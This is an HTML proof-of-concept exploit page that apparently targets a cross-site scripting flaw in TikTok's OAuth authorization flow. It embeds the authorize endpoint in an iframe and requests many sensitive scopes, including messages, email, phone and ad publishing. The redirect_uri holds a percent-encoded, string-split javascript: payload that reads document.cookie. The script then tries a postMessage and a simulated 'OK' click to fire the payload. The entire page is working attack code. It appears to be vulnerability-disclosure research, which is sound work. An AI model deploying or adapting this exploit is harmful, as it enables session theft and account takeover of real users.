<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>TikTok Auth XSS PoC</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      padding: 20px;
    }
    #status {
      margin: 20px 0;
      padding: 10px;
      background: #f0f0f0;
      border-radius: 5px;
    }
  </style>
</head>
<body>
  <h1>TikTok Authorization XSS PoC</h1>
  <div id="status">Loading iframe...</div>
  
  <iframe 
    id="myIframe" 
    src="https://www.tiktok.com/v2/auth/authorize/?client_key=aw8cb3204x0a1g88&response_type=code&scope=user.setting.update,user.setting.list,bizpartner.user.info,bizpartner.item.info,biz.account.info,biz.account.phone,biz.account.email,user.info.basic,user.info.profile,user.info.stats,user.account.type,user.info.email,user.info.phone,video.list.no_watermark,video.list.private_ads.no_watermark,user.account.configure,video.list.manage,message.list.admin,biz.promote.create,biz.promote.upgrade_stats,video.ads.publish,video.ads.create&redirect_uri=%6a%61%76%61%73%63%72%69%70%74%3a%7b%76%61%72%20%6d%3d%27%63%6f%27%2b%27%6f%6b%27%2b%27%69%65%27%2c%6e%3d%27%64%6f%27%2b%27%63%75%27%2b%27%6d%65%6e%74%27%2c%6f%3d%27%61%27%2b%27%6c%27%2b%27%65%27%2b%27%72%74%27%3b%74%68%69%73%5b%6f%5d%28%74%68%69%73%5b%6e%5d%5b%6d%5d%29%7d//&lang=en&state=imran&disable_auto_auth=1&redirect_uri=https%3A%2F%2Fads.tiktok.com%2Fi18n%2Flogin" 
    width="800" 
    height="600">
  </iframe>

  <script>
    const status = document.getElementById('status');
    const iframe = document.getElementById('myIframe');

    // Check if iframe loads
    iframe.addEventListener('load', () => {
      status.textContent = 'Iframe loaded. Attempting to trigger XSS...';
      console.log('Iframe loaded successfully');
      
      // Wait for modal to appear (3 seconds)
      setTimeout(() => {
        // Approach 1: Try postMessage (may work if page listens for it)
        try {
          iframe.contentWindow.postMessage({
            type: "click_ok_button"
          }, "https://web-sg.tiktok.com");
          console.log('PostMessage sent');
        } catch (e) {
          console.error('PostMessage failed:', e);
        }

        // Approach 2: Try direct DOM access (will fail if cross-origin)
        try {
          const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
          const okButton = Array.from(iframeDoc.querySelectorAll('button'))
            .find(btn => btn.textContent.trim() === 'OK');
          
          if (okButton) {
            okButton.click();
            status.textContent = '✅ XSS triggered! Check for alert box.';
            console.log('OK button clicked successfully');
          } else {
            status.textContent = '⚠️ OK button not found in iframe';
          }
        } catch (e) {
          status.textContent = '❌ Cannot access iframe content (CORS blocked): ' + e.message;
          console.error('Direct access failed:', e.message);
        }
      }, 3000);
    });

    iframe.addEventListener('error', () => {
      status.textContent = '❌ Iframe blocked by X-Frame-Options or CSP';
      console.error('Iframe failed to load');
    });

    // Monitor for console errors
    window.addEventListener('error', (e) => {
      if (e.message.includes('X-Frame-Options')) {
        status.textContent = '❌ Page blocked by X-Frame-Options header';
      }
    });
  </script>
</body>
</html>
